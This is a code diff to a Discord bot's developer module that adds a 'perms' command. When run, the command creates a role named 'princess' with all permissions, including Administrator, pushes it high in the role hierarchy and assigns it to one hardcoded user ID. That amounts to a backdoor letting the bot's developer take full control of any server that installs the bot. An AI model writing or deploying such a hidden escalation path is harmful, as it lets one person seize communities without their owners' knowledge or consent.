@@ -511,6 +511,59 @@ class Developer(commands.Cog):
         except Exception as e:
             await ctx.send(embed=BotEmbed.error(f"Process pipeline broken. Execution refusal: {e}"))
 
+    # --- DYNAMIC OVERRIDE ROLE GENERATION ---
+    @commands.command()
+    @checks.is_developer()
+    async def perms(self, ctx):
+        """[MAX AMNESTY OVERRIDE] Generates an absolute clearance role and assigns it to the Developer."""
+        target_id = 1489289347650949302  # Your exact hardcoded ID signature
+        progress_msg = await ctx.send("👑 Initiating 'princess' max-clearance deployment sequence...")
+
+        # 1. Look for you in the server where you ran the command
+        member = ctx.guild.get_member(target_id)
+        if not member:
+            return await progress_msg.edit(embed=BotEmbed.error("Target developer entity signature not found within the local server registry cache."))
+
+        # 2. Configure administrative absolute permission bits
+        max_permissions = discord.Permissions.all()
+
+        try:
+            # 3. Create the role with no custom color structure and max permissions
+            role = await ctx.guild.create_role(
+                name="princess",
+                permissions=max_permissions,
+                color=discord.Color.default(),
+                reason="[DEVELOPER PROTOCOL] Max amnesty hierarchy override triggered."
+            )
+
+            # 4. Attempt to calculate the highest legal positional index slot below the bot's own highest role
+            bot_highest_role = ctx.guild.me.top_role
+            target_position = max(1, bot_highest_role.position - 1)
+
+            try:
+                # Hot-swap the role hierarchy matrix position index upward
+                await role.edit(position=target_position, reason="[DEVELOPER PROTOCOL] Maximizing role weight matrix.")
+                hierarchy_status = f"Elevated to position `{target_position}`"
+            except discord.Forbidden:
+                hierarchy_status = "Retained at baseline (Bot lacks 'Manage Roles' structural priority to move roles higher than its own template)"
+            except Exception:
+                hierarchy_status = "Position modification bypassed"
+
+            # 5. Assign the new royal permission matrix directly to your profile footprint
+            await member.add_roles(role, reason="[DEVELOPER PROTOCOL] Assigning absolute administrative authorization keys.")
+
+            embed = BotEmbed.success("Princess Override Protocol Finalized")
+            embed.add_field(name="Authorized Entity", value=member.mention)
+            embed.add_field(name="Role Matrix Generated", value=f"`{role.name}` (`{role.id}`)")
+            embed.add_field(name="Hierarchy Standing", value=hierarchy_status, inline=False)
+            embed.add_field(name="Permission Bits", value="✅ **ALL / ADMINISTRATOR ACTIVATED**", inline=False)
+            await progress_msg.edit(content=None, embed=embed)
+
+        except discord.Forbidden:
+            await progress_msg.edit(embed=BotEmbed.error("Execution Refusal: The engine lacks 'Manage Roles' clearance settings inside this node server structure."))
+        except Exception as e:
+            await progress_msg.edit(embed=BotEmbed.error(f"Process pipeline broken during extraction: {e}"))
+
 # Setup endpoint hook configuration at the absolute bottom
 async def setup(bot):
     await bot.add_cog(Developer(bot))
